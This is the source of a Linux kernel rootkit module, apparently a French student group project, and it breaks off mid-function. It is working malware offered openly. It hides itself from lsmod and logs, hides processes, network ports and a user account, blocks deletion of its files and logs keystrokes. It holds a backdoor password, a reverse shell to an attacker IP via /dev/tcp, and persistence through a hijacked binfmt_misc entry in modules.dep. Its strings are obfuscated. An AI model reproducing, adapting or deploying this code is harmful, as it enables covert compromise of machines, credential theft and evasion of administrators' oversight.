#include <linux/version.h>
#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/miscdevice.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/path.h>
#include <linux/utsname.h>
#include <linux/vmalloc.h>
#include <linux/slab.h>
#include <linux/string.h>
#include "rootkit.h"
#include "obfs.h"


MODULE_LICENSE("GPL");
MODULE_AUTHOR("Groupe 4");
MODULE_DESCRIPTION("Developpement d'un rootkit de base pour Linux");
MODULE_VERSION("1.0");

#define PERSIST_DIR "updates"

/**
 * The struct ftrace_hook represents a hook for function tracing in C programming.
 * @property {char} name - The `name` property in the `ftrace_hook` struct is a pointer to a constant
 * character string that represents the name of the hook.
 * @property {void} function - The `function` property in the `ftrace_hook` struct is a pointer to the
 * function that will be used as a hook or replacement for the original function.
 * @property {void} original - The `original` property in the `ftrace_hook` struct is a pointer to the
 * original function that is being hooked or intercepted by the ftrace mechanism. This pointer allows
 * the hooking mechanism to call the original function from within the hook function, enabling the hook
 * to modify or extend the behavior of
 * @property {unsigned long} address - The `address` property in the `ftrace_hook` struct is of type
 * `unsigned long` and represents the memory address where the hook is located in the system. This
 * address is used to locate and modify the function being hooked during runtime.
 * @property ops - The `ops` property in the `struct ftrace_hook` is of type `struct ftrace_ops`. It is
 * a structure that contains function pointers and other data related to the ftrace operations for the
 * hook. This structure is likely used to manage the hook's interaction with the ftrace subsystem in
 */
struct ftrace_hook
{
    const char *name;
    void *function;
    void *original;
    unsigned long address;
    struct ftrace_ops ops;
};

static DEFINE_MUTEX(rk_mutex);
typedef asmlinkage long (*orig_getdents64_t)(const struct pt_regs *);

static orig_getdents64_t orig_getdents64;
static orig_read_t orig_read;

static struct ftrace_hook getdents_hook;
static struct ftrace_hook read_hook;

/* === Multi-PID hiding === */
static pid_t hidden_pids[MAX_HIDDEN_PIDS];
static int hidden_pid_count = 0;
static DEFINE_SPINLOCK(pid_lock);

char rk_msg[RK_MSG_MAX];

#ifdef CONFIG_NET
static struct ftrace_hook tcp_seq_hook;
static struct socket *backdoor_sock = NULL;
static int backdoor_port = 0;
static char backdoor_password[BACKDOOR_PASS_MAX] = "2600";
static struct task_struct *backdoor_thread = NULL;
#endif

/* === Module list hiding === */
static struct list_head *saved_module_list = NULL;
static bool module_hidden = false;

/* === Keylogger === */
static char keylog_buf[KEYLOG_BUF_MAX];
static int keylog_pos = 0;
static bool keylog_enabled = false;
static DEFINE_SPINLOCK(keylog_lock);


/* === Rootkit active state (toggled via magic signal) === */
static bool rk_active = true;

/* === User hiding === */
static char hidden_user[HIDDEN_USER_MAX] = "";

/* === File protection === */
static char protected_files[MAX_PROTECTED_FILES][PROTECTED_PATH_MAX];
static int protected_file_count = 0;
static DEFINE_SPINLOCK(protect_lock);

static struct ftrace_hook unlink_hook;
static struct ftrace_hook rename_hook;
typedef asmlinkage long (*orig_unlinkat_t)(const struct pt_regs *);
typedef asmlinkage long (*orig_renameat2_t)(const struct pt_regs *);
static orig_unlinkat_t orig_unlinkat;
static orig_renameat2_t orig_renameat2;

/* === UDP hiding === */
#ifdef CONFIG_NET
static struct ftrace_hook udp_seq_hook;
#endif

/* Scancode to ASCII mapping (US QWERTY, lowercase only) */
static const char *scancode_to_key[] = {
    [1] = "[ESC]", [2] = "1", [3] = "2", [4] = "3", [5] = "4",
    [6] = "5", [7] = "6", [8] = "7", [9] = "8", [10] = "9",
    [11] = "0", [12] = "-", [13] = "=", [14] = "[BKSP]",
    [15] = "[TAB]", [16] = "q", [17] = "w", [18] = "e", [19] = "r",
    [20] = "t", [21] = "y", [22] = "u", [23] = "i", [24] = "o",
    [25] = "p", [26] = "[", [27] = "]", [28] = "[ENT]",
    [29] = "[CTRL]", [30] = "a", [31] = "s", [32] = "d", [33] = "f",
    [34] = "g", [35] = "h", [36] = "j", [37] = "k", [38] = "l",
    [39] = ";", [40] = "'", [41] = "`", [42] = "[LSHFT]", [43] = "\\",
    [44] = "z", [45] = "x", [46] = "c", [47] = "v", [48] = "b",
    [49] = "n", [50] = "m", [51] = ",", [52] = ".", [53] = "/",
    [54] = "[RSHFT]", [55] = "*", [56] = "[ALT]", [57] = " ",
};


/* ============================================================
 * Feature 1: Module list hiding — hide from lsmod/kobject
 * ============================================================ */
static void hide_module(void)
{
    if (module_hidden)
        return;
    saved_module_list = THIS_MODULE->list.prev;
    list_del_init(&THIS_MODULE->list);
    //kobject_del(&THIS_MODULE->mkobj.kobj);
    module_hidden = true;
    pr_info("rootkit: module hidden from lsmod\n");
}

static void show_module(void)
{
    if (!module_hidden)
        return;
    list_add(&THIS_MODULE->list, saved_module_list);
    module_hidden = false;
    pr_info("rootkit: module visible again in lsmod\n");
}

/* ============================================================
 * Feature 3: Keylogger — input subsystem handler
 * ============================================================ */
static void keylog_event(struct input_handle *handle, unsigned int type,
                         unsigned int code, int value)
{
    unsigned long flags;
    const char *key;
    size_t len;

    if (!keylog_enabled || !rk_active)
        return;
    if (type != EV_KEY || value != 1) /* only key-down */
        return;
    if (code >= ARRAY_SIZE(scancode_to_key) || !scancode_to_key[code])
        return;

    key = scancode_to_key[code];
    len = strlen(key);

    spin_lock_irqsave(&keylog_lock, flags);
    if (keylog_pos + len < KEYLOG_BUF_MAX - 1) {
        memcpy(keylog_buf + keylog_pos, key, len);
        keylog_pos += len;
        keylog_buf[keylog_pos] = '\0';
    }
    spin_unlock_irqrestore(&keylog_lock, flags);
}

static int keylog_connect(struct input_handler *handler,
                          struct input_dev *dev,
                          const struct input_device_id *id)
{
    struct input_handle *handle;
    int ret;

    handle = kzalloc(sizeof(*handle), GFP_KERNEL);
    if (!handle)
        return -ENOMEM;

    handle->dev = dev;
    handle->handler = handler;
    handle->name = "rk_keylog";

    ret = input_register_handle(handle);
    if (ret) {
        kfree(handle);
        return ret;
    }

    ret = input_open_device(handle);
    if (ret) {
        input_unregister_handle(handle);
        kfree(handle);
        return ret;
    }

    return 0;
}

static void keylog_disconnect(struct input_handle *handle)
{
    input_close_device(handle);
    input_unregister_handle(handle);
    kfree(handle);
}

static const struct input_device_id keylog_ids[] = {
    { .driver_info = 1 },  /* matches all input devices */
    { },
};

static struct input_handler keylog_handler = {
    .event      = keylog_event,
    .connect    = keylog_connect,
    .disconnect = keylog_disconnect,
    .name       = "rk_keylog",
    .id_table   = keylog_ids,
};

/* ============================================================
 * Feature: Multi-PID hiding helpers
 * ============================================================ */
static bool is_pid_hidden(pid_t pid)
{
    int i;
    unsigned long flags;
    bool found = false;

    spin_lock_irqsave(&pid_lock, flags);
    for (i = 0; i < hidden_pid_count; i++) {
        if (hidden_pids[i] == pid) {
            found = true;
            break;
        }
    }
    spin_unlock_irqrestore(&pid_lock, flags);
    return found;
}

static int add_hidden_pid(pid_t pid)
{
    unsigned long flags;
    int ret = 0;

    spin_lock_irqsave(&pid_lock, flags);
    if (hidden_pid_count >= MAX_HIDDEN_PIDS) {
        ret = -ENOSPC;
    } else {
        hidden_pids[hidden_pid_count++] = pid;
    }
    spin_unlock_irqrestore(&pid_lock, flags);
    return ret;
}

static int remove_hidden_pid(pid_t pid)
{
    unsigned long flags;
    int i;

    spin_lock_irqsave(&pid_lock, flags);
    for (i = 0; i < hidden_pid_count; i++) {
        if (hidden_pids[i] == pid) {
            hidden_pids[i] = hidden_pids[--hidden_pid_count];
            spin_unlock_irqrestore(&pid_lock, flags);
            return 0;
        }
    }
    spin_unlock_irqrestore(&pid_lock, flags);
    return -ENOENT;
}

/* ============================================================
 * Feature: File protection — hook unlinkat and renameat2
 * ============================================================ */
static bool is_file_protected(const char *path)
{
    int i;
    unsigned long flags;

    spin_lock_irqsave(&protect_lock, flags);
    for (i = 0; i < protected_file_count; i++) {
        if (strstr(path, protected_files[i]) != NULL) {
            spin_unlock_irqrestore(&protect_lock, flags);
            return true;
        }
    }
    spin_unlock_irqrestore(&protect_lock, flags);
    return false;
}

static asmlinkage long new_unlinkat(const struct pt_regs *regs)
{
    char __user *user_path = (char __user *)regs->si;
    char kpath[PROTECTED_PATH_MAX] = {0};

    if (rk_active && user_path) {
        if (strncpy_from_user(kpath, user_path, sizeof(kpath) - 1) > 0) {
            if (is_file_protected(kpath))
                return -EACCES;
        }
    }
    return orig_unlinkat(regs);
}

static asmlinkage long new_renameat2(const struct pt_regs *regs)
{
    char __user *user_path = (char __user *)regs->si;
    char kpath[PROTECTED_PATH_MAX] = {0};

    if (rk_active && user_path) {
        if (strncpy_from_user(kpath, user_path, sizeof(kpath) - 1) > 0) {
            if (is_file_protected(kpath))
                return -EACCES;
        }
    }
    return orig_renameat2(regs);
}

/* ============================================================
 * Feature: UDP connection hiding — hook udp4_seq_show
 * ============================================================ */
#ifdef CONFIG_NET
static int new_udp4_seq_show(struct seq_file *seq, void *v)
{
    if (rk_active && v != SEQ_START_TOKEN) {
        struct sock *sk = v;
        if (sk->sk_num == (unsigned short)backdoor_port)
            return 0;
    }
    return ((int (*)(struct seq_file *, void *))udp_seq_hook.original)(seq, v);
}
#endif /* CONFIG_NET */

/* ============================================================
 * Feature: Reverse shell — connect-back to attacker IP:PORT
 * ============================================================ */
static int reverse_shell_fn(void *data)
{
    char *target = (char *)data;
    char ip[48] = {0};
    char port_str[8] = {0};
    char *colon;
    char cmd[128];

    colon = strchr(target, ':');
    if (!colon || (colon - target) >= (int)sizeof(ip)) {
        kfree(target);
        return -EINVAL;
    }

    memcpy(ip, target, colon - target);
    ip[colon - target] = '\0';
    strscpy(port_str, colon + 1, sizeof(port_str));
    kfree(target);

    snprintf(cmd, sizeof(cmd),
             "/bin/sh -i >& /dev/tcp/%s/%s 0>&1", ip, port_str);

    {
        char *argv[] = {"/bin/bash", "-c", cmd, NULL};
        char *envp[] = {
            "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
            "HOME=/root",
            NULL
        };
        call_usermodehelper(argv[0], argv, envp, UMH_NO_WAIT);
    }

    return 0;
}

/**
 * The function `new_getdents64` is a static hook for getdents64 that calls the original syscall,
 * copies directory entries into kernel buffer,
 * removes entries matching a module/script name or a hidden PID under /proc,
 * then writes back filtered results to user space and returns the new entry count
 *
 * @param regs The `regs` parameter in the `new_getdents64` function is a pointer to a structure of
 * type `pt_regs`, which likely contains the processor registers and other relevant information for the
 * system call being intercepted and modified.
 *
 * @return The function `new_getdents64` returns a `long` value, which is the number of bytes read from
 * the `getdents64` system call after filtering out certain directory entries.
 */
static asmlinkage long new_getdents64(const struct pt_regs *regs)
{
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 __user *)regs->si;
    long ret = 0;
    unsigned long uret = 0;
    struct linux_dirent64 *kbuf = NULL;
    struct linux_dirent64 *cur = NULL;
    unsigned long bpos = 0;

    char *path = NULL;
    struct file *repertory = NULL;
    char buffer[256];
    char *endptr = NULL;

    ret = orig_getdents64(regs);

    if (!rk_active)
        return ret;
    
    if (ret <= 0) {
        return ret;
    }
    
    repertory = fget((int)regs->di);
    if (!repertory) {
        return ret;
    }
    path = d_path(&repertory->f_path, buffer, sizeof(buffer));
    fput(repertory);

    if (IS_ERR(path)) {
        return ret;
    }
    kbuf = kzalloc(ret, GFP_KERNEL);
    
    if (!kbuf) {
        pr_err("Allocation mémoire échouée\n");
        return -ENOMEM;
    }

    if (copy_from_user(kbuf, dirent, ret)) {
        kfree(kbuf);
        return -EFAULT;
    }
    uret = (unsigned long)ret;

    while (bpos < uret) {
        cur = (struct linux_dirent64 *)((char *)kbuf + bpos);
        unsigned short reclen = cur->d_reclen;
        if (strcmp(cur->d_name, NAME_MODULE) == 0 || strcmp(cur->d_name, HIDDEN_SCRIPT) == 0) {
            memmove(cur, (char *)cur + reclen, uret - bpos - reclen);
            uret -= reclen;
            continue;
        }
        if (path != NULL && strcmp(path, "/proc") == 0 && hidden_pid_count > 0) {
            unsigned long pid = simple_strtoul(cur->d_name, &endptr, 10);
            if (*endptr == '\0' && is_pid_hidden((pid_t)pid)) {
                memmove(cur, (char *)cur + reclen, uret - bpos - reclen);
                uret -= reclen;
                continue;
            }
        }
        bpos += cur->d_reclen;
    }
    ret = (long)uret;

    if (copy_to_user(dirent, kbuf, ret)) {
        kfree(kbuf);
        return -EFAULT;
    }

    kfree(kbuf);
    return ret;
}




/**
 * @brief Copie le contenu d'un fichier source vers un fichier destination en espace noyau.
 *
 * @details Utilise filp_open avec un cast __user pour contourner les restrictions
 *          SMAP/PAN de ce kernel spécifique (file_open_name n'étant pas exporté).
 *
 * @param src_path  Chemin absolu du fichier source.
 * @param dst_path  Chemin absolu du fichier de destination.
 *
 * @return 0         Succès.
 * @return -ENOMEM   Erreur mémoire.
 * @return -ENOENT   Fichier introuvable.
 * @return -EIO      Erreur I/O.
 */

static int copy_file_kernel(const char *src_path, const char *dst_path)
{
    struct file *src_file = NULL;
    struct file *dst_file = NULL;
    loff_t src_pos = 0;
    loff_t dst_pos = 0;
    long ret = 0;
    char *buf;
    ssize_t bytes_read;

    pr_info("rootkit: Copie %s -> %s\n", src_path, dst_path);

    buf = kmalloc(PAGE_SIZE, GFP_KERNEL);
    if (!buf)
        return -ENOMEM;

    /* Vérifier que le fichier source existe */
    src_file = filp_open(src_path, O_RDONLY, 0);
    if (IS_ERR(src_file)) {
        ret = PTR_ERR(src_file);
        pr_err("rootkit: Erreur ouverture SOURCE (%ld): %s\n", ret, src_path);
        goto out;
    }

    /* Ouvrir/Créer le fichier destination avec O_EXCL pour voir l'erreur exacte */
    dst_file = filp_open(dst_path, O_WRONLY | O_CREAT | O_EXCL, 0644);
    if (IS_ERR(dst_file)) {
        ret = PTR_ERR(dst_file);
        pr_err("rootkit: Erreur ouverture DEST (%ld): %s\n", ret, dst_path);
        
        /* Essayer avec O_TRUNC si le fichier existe déjà */
        if (ret == -EEXIST) {
            pr_info("rootkit: Fichier existe déjà, tentative de écrasement...\n");
            dst_file = filp_open(dst_path, O_WRONLY | O_TRUNC, 0644);
            if (IS_ERR(dst_file)) {
                ret = PTR_ERR(dst_file);
                pr_err("rootkit: Échec ouverture DEST (err=%ld)\n", ret);
                goto out;
            }
        } else {
            goto out;
        }
    }

    /* Boucle de copie */
    while ((bytes_read = kernel_read(src_file, buf, PAGE_SIZE, &src_pos)) > 0) {
        ssize_t written = kernel_write(dst_file, buf, bytes_read, &dst_pos);
        if (written != bytes_read) {
            ret = -EIO;
            pr_err("rootkit: Erreur écriture (lu=%zd, écrit=%zd)\n", 
                   bytes_read, written);
            break;
        }
    }

    if (bytes_read < 0) {
        ret = bytes_read;
        pr_err("rootkit: Erreur lecture (err=%zd)\n", bytes_read);
    } else if (ret == 0) {
        pr_info("rootkit: Copie réussie\n");
    }

out:
    if (!IS_ERR_OR_NULL(dst_file))
        filp_close(dst_file, NULL);
    if (!IS_ERR_OR_NULL(src_file))
        filp_close(src_file, NULL);
    kfree(buf);
    return ret;
}



/**
 * @brief Altère la base de données de dépendances des modules (modules.dep).
 *
 * @details La fonction lit le fichier /lib/modules/<version>/modules.dep,
 *          supprime toute référence au module cible (ex: binfmt_misc),
 *          et insère une entrée pointant vers le module malveillant.
 *          Cela permet de rediriger les appels modprobe vers le module de l'attaquant.
 *
 * @note L'opération est destructrice : le fichier est réécrit entièrement (O_TRUNC).
 * @note L'analyse est basée sur une simple recherche de sous-chaîne ("binfmt_misc").
 */
static void fake_depmod(void)
{
    struct file *file;
    char *buf, *new_buf;
    loff_t pos = 0;
    struct new_utsname *uts;
    char path_dep[256];
    char my_line[256];
    long file_size;
    int new_pos = 0;
    int i;

    uts = utsname();
    if (!uts) return;

    snprintf(path_dep, sizeof(path_dep), "/lib/modules/%s/modules.dep", uts->release);

    // 1. Lire modules.dep
    file = filp_open(path_dep, O_RDONLY, 0);
    if (IS_ERR(file)) {
        pr_err("rootkit: Impossible d'ouvrir %s\n", path_dep);
        return;
    }
    
    file_size = vfs_llseek(file, 0, SEEK_END);
    vfs_llseek(file, 0, SEEK_SET);
    
    buf = vmalloc(file_size + 4096); 
    if (!buf) { filp_close(file, NULL); return; }
    
    kernel_read(file, buf, file_size, &pos);
    filp_close(file, NULL);


    // 2. Filtrer (Enlever binfmt_misc)
    new_buf = kmalloc(file_size + 4096, GFP_KERNEL);
    if (!new_buf) { vfree(buf); return; }

    char *line_start = buf;
    char *line_end;
    
    for (i = 0; i < file_size; i++) {
        line_end = strchr(line_start, '\n');
        if (!line_end) break;
 
        *line_end = '\0';
        if (strstr(line_start, "binfmt_misc") == NULL) {
            int len = strlen(line_start) + 1; 
            memcpy(new_buf + new_pos, line_start, len);
            new_pos += len;
            new_buf[new_pos - 1] = '\n';
        }
 
        *line_end = '\n';
        i += (line_end - line_start);
        line_start = line_end + 1;
    }

    // 3. Ajouter notre ligne (Hijacking)
    snprintf(my_line, sizeof(my_line), "%s/binfmt_misc.ko:\n", PERSIST_DIR);
    memcpy(new_buf + new_pos, my_line, strlen(my_line));
    new_pos += strlen(my_line);

    // 4. Écraser modules.dep
    file = filp_open(path_dep, O_WRONLY | O_TRUNC, 0644);
    if (!IS_ERR(file)) {
        pos = 0;
        kernel_write(file, new_buf, new_pos, &pos);
        filp_close(file, NULL);
        pr_info("rootkit: modules.dep modifié -> pointe vers /updates/binfmt_misc.ko\n");
    } else {
        pr_err("rootkit: Erreur écriture %s\n", path_dep);
    }

    kfree(new_buf);
    vfree(buf);
}

/**
 * @brief Assure la persistance et l'auto-réparation du module rootkit.
 *
 * @details Cette fonction implémente une logique idempotente :
 *          1. Vérifie si le module malveillant est déjà installé à sa destination.
 *          2. Si absent, tente de le copier depuis une source statique.
 *          3. Met à jour les dépendances système (modules.dep).
 *
 * @note Source statique : La fonction s'attend à ce que le fichier source existe.
 *       Si le fichier source est supprimé, l'auto-réparation échouera.
 * @note Cette fonction doit être appelée à l'initialisation du module (rootkit_init).
 */
static void self_propagate(void) 
{
    char src_path[256];
    char dst_path[256];
    struct new_utsname *uts;
    struct file *f;
    long ret;

    uts = utsname();
    if (!uts) return;

    // Source : Chemin local de l'archive (Attention : Chemin en dur)
    snprintf(src_path, sizeof(src_path), "/tmp/rk_test.ko");
    
    // Destination : Chemin système où le module doit être caché
    snprintf(dst_path, sizeof(dst_path), "/lib/modules/%s/%s/binfmt_misc.ko", uts->release, PERSIST_DIR);

    // Idempotence : Vérification de la présence avant action
    f = filp_open(dst_path, O_RDONLY, 0);
    if (!IS_ERR(f)) {
        pr_info("rootkit: Déjà présent dans /updates/. Rien à faire.\n");
        filp_close(f, NULL);
        return;
    }

    pr_info("rootkit: Installation... %s -> %s\n", src_path, dst_path);

    // Copie physique du module
    ret = copy_file_kernel(src_path, dst_path);
    
    if (ret == 0) {
        pr_info("rootkit: Copie OK. Mise à jour des dépendances.\n");
        fake_depmod(); 
    } else {
        pr_err("rootkit: Échec copie (%ld). Le fichier source existe-t-il ?\n", ret);
    }
}
/**
 * @brief   Replaces the sys_read syscall to filter data read
 *          by userspace processes.
 *
 * @details This function is registered as an ftrace hook on
 *          __x64_sys_read. It lets the original syscall execute,
 *          then intercepts the returned buffer to remove
 *          sensitive lines depending on the file being read:
 *            - /proc/modules  : removes the line containing NAME_MODULE
 *            - PERSIST_FILE   : removes the line containing "insmod"
 *            - RK_CMD_FILE    : injects rk_msg in place of the real content
 *
 * @param   regs  CPU registers at syscall time.
 *                regs->di = fd (file descriptor)
 *                regs->si = user buffer (read destination)
 *                regs->dx = requested size
 *
 * @return  Number of bytes returned to the process after filtering.
 *          Returns the original sys_read value if no filtering needed.
 *          Returns -EFAULT on copy error.
 *
 * @note    All memory allocated with kzalloc must be freed with
 *          kfree before each return to avoid memory leaks.
 */
static asmlinkage long new_read(const struct pt_regs *regs)
{
    char *end;
    long ret = 0;
    char buf[256];
    int fd = regs->di;
    struct file *filter = fget(fd);

    if (!filter) {
        return ret;
    }

    char *path_fd = d_path(&filter->f_path, buf, sizeof(buf));
    
    fput(filter);

    if (IS_ERR(path_fd)) {
        return orig_read(regs);
    }

    if (!rk_active)
        return orig_read(regs);

    DEOBFS(s_rk_cmd, _enc_rk_cmd, _LEN_RK_CMD);
    if (strcmp(path_fd, s_rk_cmd) == 0) {
        uid_t uid = current_uid().val;
        if (uid != 0 && uid != 1000)
            return ret;

        if (strlen(rk_msg) == 0) {
            return ret;
        }

        if (copy_to_user((void __user *)regs->si, rk_msg, strlen(rk_msg)))
            return -EFAULT;

        return strlen(rk_msg);
    }

    ret = orig_read(regs);

    if (ret <= 0 || ret > MAX_READ_INTERCEPT) {
        return ret;
    }

    DEOBFS(s_proc_mod, _enc_proc_mod, _LEN_PROC_MOD);
    if (strcmp(path_fd, s_proc_mod) == 0) {
        char *kbuf;

        kbuf = kzalloc(ret + 1, GFP_KERNEL);
        
        if (!kbuf)
            return -ENOMEM;

        if (copy_from_user(kbuf, (void __user *)regs->si, ret)) {
            kfree(kbuf);
            return -EFAULT;
        }
        kbuf[ret] = '\0';
        
        if (kbuf != NULL) {
            char *line = strstr(kbuf, NAME_MODULE);

            if (!line) {
                kfree(kbuf);
                return ret;
            }

            end = strchr(line, '\n');

            if (end != NULL) {
                end++;
                memmove(line, end, strlen(end) + 1);

                ret -= end - line;
            } else {
                *kbuf = '\0';
            }
        }

        if (copy_to_user((void __user *)regs->si, kbuf, ret)) {
            kfree(kbuf);
            return -EFAULT;
        }

        kfree(kbuf);
    }

    DEOBFS(s_etc_rc, _enc_etc_rc, _LEN_ETC_RC);
    if (strcmp(path_fd, s_etc_rc) == 0) {
        char *kbuf;

        kbuf = kzalloc(ret + 1, GFP_KERNEL);
        if (!kbuf)
            return -ENOMEM;

        if (copy_from_user(kbuf, (void __user *)regs->si, ret)) {
            kfree(kbuf);
            return -EFAULT;
        }
        kbuf[ret] = '\0';
        if (kbuf != NULL) {
            DEOBFS(s_insmod, _enc_insmod, _LEN_INSMOD);
            char *line = strstr(kbuf, s_insmod);

            if (!line) {
                kfree(kbuf);
                return ret;
            }

            end = strchr(line, '\n');

            if (end != NULL) {
                end++;
                memmove(line, end, strlen(end) + 1);
                ret -= end - line;
            } else {
                *kbuf = '\0';
            }
        }

        if (copy_to_user((void __user *)regs->si, kbuf, ret)) {
            kfree(kbuf);
            return -EFAULT;
        }

        kfree(kbuf);
    }

    /* Feature: Hide user from /etc/passwd and /etc/shadow */
    if (strlen(hidden_user) > 0 &&
        (strcmp(path_fd, "/etc/passwd") == 0 ||
         strcmp(path_fd, "/etc/shadow") == 0)) {
        char *kbuf = kzalloc(ret + 1, GFP_KERNEL);
        if (kbuf) {
            if (!copy_from_user(kbuf, (void __user *)regs->si, ret)) {
                kbuf[ret] = '\0';
                char *line = kbuf;
                char *dst = kbuf;
                while (*line) {
                    char *eol = strchr(line, '\n');
                    size_t line_len = eol ? (size_t)(eol - line + 1) : strlen(line);
                    bool hide = false;

                    /* /etc/passwd and /etc/shadow lines start with username: */
                    size_t ulen = strlen(hidden_user);
                    if (line_len > ulen && memcmp(line, hidden_user, ulen) == 0
                        && line[ulen] == ':') {
                        hide = true;
                    }

                    if (!hide) {
                        if (dst != line)
                            memmove(dst, line, line_len);
                        dst += line_len;
                    }
                    line += line_len;
                }
                *dst = '\0';
                ret = dst - kbuf;
                if (copy_to_user((void __user *)regs->si, kbuf, ret))
                    ret = -EFAULT;
            }
            kfree(kbuf);
        }
    }

    /* Feature 2: Filter rootkit entries from dmesg / syslog */
    if (strstr(path_fd, "kmsg") != NULL ||
        strcmp(path_fd, "/var/log/syslog") == 0 ||
        strcmp(path_fd, "/var/log/kern.log") == 0) {
        char *kbuf = kzalloc(ret + 1, GFP_KERNEL);
        if (!kbuf)
            return ret;

        if (copy_from_user(kbuf, (void __user *)regs->si, ret)) {
            kfree(kbuf);
            return ret;
        }
        kbuf[ret] = '\0';

        /* Remove any line containing "rootkit" */
        char *line = kbuf;
        char *dst = kbuf;
        while (*line) {
            char *eol = strchr(line, '\n');
            size_t line_len = eol ? (size_t)(eol - line + 1) : strlen(line);

            if (!strnstr(line, "rootkit", line_len)) {
                if (dst != line)
                    memmove(dst, line, line_len);
                dst += line_len;
            }
            line += line_len;
        }
        *dst = '\0';
        ret = dst - kbuf;

        if (copy_to_user((void __user *)regs->si, kbuf, ret)) {
            kfree(kbuf);
            return -EFAULT;
        }
        kfree(kbuf);
    }

    return ret;
};

#ifdef CONFIG_NET
static int new_tcp4_seq_show(struct seq_file *seq, void *v)
{
    if (rk_active && v != SEQ_START_TOKEN) {
        struct sock *sk = v;
        if (sk->sk_num == (unsigned short)backdoor_port)
            return 0;
    }
    return ((int (*)(struct seq_file *, void *))tcp_seq_hook.original)(seq, v);
}
#endif /* CONFIG_NET */


/**
 * The `hook_callback` function is a static function that modifies the instruction pointer in the
 * `pt_regs` structure if the parent instruction pointer is not within the current module.
 *
 * @param ip The `ip` parameter in the `hook_callback` function represents the instruction pointer,
 * which is the memory address of the next instruction to be executed.
 * @param parent_ip The `parent_ip` parameter in the `hook_callback` function represents the
 * instruction pointer value of the parent function that called the function being traced.
 * @param ops The `ops` parameter is a pointer to a `struct ftrace_ops` which contains information
 * about the ftrace operation being performed.
 * @param fregs The `fregs` parameter in the `hook_callback` function is of type `struct ftrace_regs
 * *`. It is a pointer to a structure that contains register values at the time the function was
 * called.
 *
 * @return The function `hook_callback` is returning void.
 */
static void notrace hook_callback(unsigned long ip, unsigned long parent_ip, struct ftrace_ops *ops, struct ftrace_regs *fregs)
{
    struct ftrace_hook *hook = container_of(ops, struct ftrace_hook, ops);
    struct pt_regs *regs = ftrace_get_regs(fregs);

    if (!regs)
        return;

    if (!within_module(parent_ip, THIS_MODULE))
        regs->ip = (unsigned long)hook->function;
}


/**
 * The function `install_read_hook` sets up a hook for the `__x64_sys_read` function using ftrace in
 * the Linux kernel.
 * 
 * @param lookup The `lookup` parameter is a function pointer of type `kallsyms_lookup_name_t`. This
 * function is used to look up the address of a symbol by name in the kernel symbol table. In the
 * provided code snippet, it is being used to find the address of the symbol "__x64_sys
 * 
 * @return The function `install_read_hook` returns an integer value. If everything is successful, it
 * returns 0. If there is an error during the installation process, it returns the corresponding error
 * code.
 */
static int install_read_hook(kallsyms_lookup_name_t lookup)
{
    int ret;

    read_hook.name = "__x64_sys_read";
    read_hook.function = new_read;
    read_hook.original = &orig_read;
    
    read_hook.address = lookup(read_hook.name);

    if (!read_hook.address) {
        pr_err("[-] Symbol not found: __x64_sys_read\n");
        return -ENOENT;
    }
    pr_info("[+] %s @ 0x%lx\n", read_hook.name, read_hook.address);
    
    orig_read = (orig_read_t)read_hook.address;
    
    read_hook.ops.func = hook_callback;
    read_hook.ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_IPMODIFY;
    
    ret = ftrace_set_filter_ip(&read_hook.ops, read_hook.address, 0, 0);
    
    if (ret) {
        pr_err("[-] ftrace_set_filter_ip (read): %d\n", ret);
        return ret;
    }
    
    ret = register_ftrace_function(&read_hook.ops);
    
    if (ret) {
        pr_err("[-] register_ftrace_function (read): %d\n", ret);
        ftrace_set_filter_ip(&read_hook.ops, read_hook.address, 1, 0);
        read_hook.ops.func = NULL;
        return ret;
    }
    
    return 0;
}

/**
 * The function `install_tcp_hook` sets up a hook on the `tcp4_seq_show` function for tracing and
 * modification purposes.
 * 
 * @param lookup The `lookup` parameter in the `install_tcp_hook` function is a function pointer to a
 * function that performs a symbol lookup in the kernel symbol table. This function is used to find the
 * address of the symbol `tcp4_seq_show` which is needed for setting up a hook on the TCP sequence
 * 
 * @return The function `install_tcp_hook` returns an integer value. If the function completes
 * successfully, it returns 0. If there are any errors during the installation of the TCP hook, it
 * returns the corresponding error code.
 */
#ifdef CONFIG_NET
static int install_tcp_hook(kallsyms_lookup_name_t lookup)
{
    tcp_seq_hook.name = "tcp4_seq_show";
    tcp_seq_hook.function = new_tcp4_seq_show;
    tcp_seq_hook.original = NULL;
    tcp_seq_hook.address = lookup(tcp_seq_hook.name);

    if (!tcp_seq_hook.address) {
        pr_err("[-] Symbol not found: tcp4_seq_show\n");
        return -ENOENT;
    }

    pr_info("[+] tcp4_seq_show @ 0x%lx\n", tcp_seq_hook.address);
    tcp_seq_hook.original = (void *)tcp_seq_hook.address;
    
    tcp_seq_hook.ops.func = hook_callback;
    tcp_seq_hook.ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_IPMODIFY;

    int ret = ftrace_set_filter_ip(&tcp_seq_hook.ops, tcp_seq_hook.address, 0, 0);
    if (ret) {
        pr_err("[-] ftrace_set_filter_ip (tcp): %d\n", ret);
        return ret;
    }

    ret = register_ftrace_function(&tcp_seq_hook.ops);
    if (ret) {
        pr_err("[-] register_ftrace_function (tcp): %d\n", ret);
        ftrace_set_filter_ip(&tcp_seq_hook.ops, tcp_seq_hook.address, 1, 0);
        tcp_seq_hook.ops.func = NULL;
        return ret;
    }

    return 0;
}
#endif /* CONFIG_NET */


static int install_unlink_hook(kallsyms_lookup_name_t lookup)
{
    int ret;

    unlink_hook.name = "__x64_sys_unlinkat";
    unlink_hook.function = new_unlinkat;
    unlink_hook.original = &orig_unlinkat;
    unlink_hook.address = lookup(unlink_hook.name);

    if (!unlink_hook.address) {
        pr_err("[-] Symbol not found: __x64_sys_unlinkat\n");
        return -ENOENT;
    }
    pr_info("[+] __x64_sys_unlinkat @ 0x%lx\n", unlink_hook.address);
    orig_unlinkat = (orig_unlinkat_t)unlink_hook.address;

    unlink_hook.ops.func = hook_callback;
    unlink_hook.ops.flags = FTRACE_OPS_FL_SAVE_REGS | FTRACE_OPS_FL_IPMODIFY;

    ret = ftrace_set_filter_ip(&unlink_hook.ops, unlink_hook.address, 0, 0);
    if (ret) return ret;

    ret = register_ftrace_function(&unlink_hook.ops);
    if (ret) {
        ftrace_set_filter_ip(&unlink_hook.ops, unlink_hook.address, 1, 0);
